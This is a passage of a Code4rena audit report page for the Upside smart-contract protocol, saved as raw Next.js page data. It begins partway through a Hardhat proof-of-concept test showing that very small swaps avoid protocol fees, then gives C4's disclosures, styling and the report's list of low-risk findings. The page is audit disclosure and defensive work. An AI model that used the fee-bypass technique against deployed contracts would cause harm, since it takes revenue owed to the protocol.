upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint user1 with liquidityToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify user1 received the correct liquidity token balance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Perform a swap with an extremely small input amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _tokenAmount = hhethers.parseUnits(\u0026quot;0.000099\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _tokenAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).swap(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await sampleLinkToken.getAddress(),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      _tokenAmount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await user1.getAddress()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 receives a non-zero amount of LINK tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LinkTokenBalance = await sampleLinkToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LinkTokenBalance).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check that no protocol fees were collected from the swap\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let claimableProtocolFees = await upsideProtocol.claimableProtocolFees();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(claimableProtocolFees).to.be.eq(0); // Fee bypass confirmed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues deemed invalid by the judge have been removed for reporting purposes.\u003c/em\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"19:{\"name\":\"Upside\",\"link\":\"https://x.com/UpsideFun\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-Yqsfiw92mZH\"}\n1a:{\"start_time\":\"2025-05-19T20:00:00.000Z\",\"end_time\":\"2025-05-26T20:00:00.000Z\",\"bot_race_time_limit\":1}\n17:{\"uid\":\"buoDy35wJHw\",\"slug\":\"2025-05-upside\",\"title\":\"Upside\",\"sponsor\":\"Upside\",\"date\":\"2025-06-08\",\"findings\":\"https://code4rena.com/audits/2025-05-upside/submissions\",\"contest\":506,\"alt_url\":null,\"html\":\"$18\",\"toc\":\"\u003cul\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href=\\\"#overview\\\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#about-c4\\\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#summary\\\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#scope\\\"\u003eScope\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#severity-criteria\\\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href=\\\"#low-risk-and-non-critical-issues\\\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#01-front-running-attack-in-tokenize-function\\\"\u003e01 Front-running attack in tokenize function\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\\\"\u003e02 Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#03-swap-fee-bypass-via-small-trade-amounts\\\"\u003e03 Swap fee bypass via small trade amounts\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#disclosures\\\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\",\"created_at\":\"2025-06-08T19:51:27.685Z\",\"updated_at\":\"2025-06-08T19:51:27.685Z\",\"sponsor_data\":\"$19\",\"contest_data\":\"$1a\"}\n8:[\"$\",\"$L13\",null,{\"landingPage\":[\"$\",\"$L14\",null,{\"report\":{\"uid\":\"buoDy35wJHw\",\"slug\":\"2025-05-upside\",\"title\":\"Upside\",\"sponsor\":\"Upside\",\"date\":\"2025-06-08\",\"findings\":\"https://code4rena.com/audits/2025-05-upside/submissions\",\"contest\":506,\"alt_url\":null,\"html\":\"$15\",\"toc\":\"\u003cul\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href=\\\"#overview\\\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#about-c4\\\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#summary\\\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#scope\\\"\u003eScope\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#severity-criteria\\\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href="])</script><script>self.__next_f.push([1,"\\\"#low-risk-and-non-critical-issues\\\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#01-front-running-attack-in-tokenize-function\\\"\u003e01 Front-running attack in tokenize function\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\\\"\u003e02 Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#03-swap-fee-bypass-via-small-trade-amounts\\\"\u003e03 Swap fee bypass via small trade amounts\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#disclosures\\\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\",\"created_at\":\"2025-06-08T19:51:27.685Z\",\"updated_at\":\"2025-06-08T19:51:27.685Z\",\"sponsor_data\":{\"name\":\"Upside\",\"link\":\"https://x.com/UpsideFun\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-Yqsfiw92mZH\"},\"contest_data\":{\"start_time\":\"2025-05-19T20:00:00.000Z\",\"end_time\":\"2025-05-26T20:00:00.000Z\",\"bot_race_time_limit\":1}}}],\"coreAppPage\":[\"$\",\"$L16\",null,{\"report\":\"$17\"}]}]\ne:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"application-name\",\"content\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:site_name\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:card\",\"content\":\"su"])</script><script>self.__next_f.push([1,"mmary_large_image\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"link\",\"14\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"256x256\"}],[\"$\",\"link\",\"15\",{\"rel\":\"icon\",\"href\":\"/logos/c4/c4-favicon-32.png\"}],[\"$\",\"link\",\"16\",{\"rel\":\"apple-touch-icon\",\"href\":\"/logos/c4/apple-touch-icon.png\"}],[\"$\",\"meta\",\"17\",{\"name\":\"next-size-adjust\"}]]\n7:null\n"])</script><next-route-announcer style="position: absolute;"><template shadowrootmode="open"><div aria-live="assertive" id="__next-route-announcer__" role="alert" style="position: absolute; border: 0px; height: 1px; margin: -1px; padding: 0px; width: 1px; clip: rect(0px, 0px, 0px, 0px); overflow: hidden; white-space: nowrap; overflow-wrap: normal;"></div></template></next-route-announcer><wcm-modal><template shadowrootmode="open"><!----><wcm-explorer-context><template shadowrootmode="open"><!----></template></wcm-explorer-context><wcm-theme-context><template shadowrootmode="open"><!----></template></wcm-theme-context><div id="wcm-modal" role="alertdialog" aria-modal="true" class=" wcm-overlay "><div class="wcm-container" tabindex="0"><!--?lit$7103405346$--></div></div></template></wcm-modal><div id="mttContainer" class="notranslate" aria-expanded="false" style="transform: translate(546px, 283px);"></div></body></html>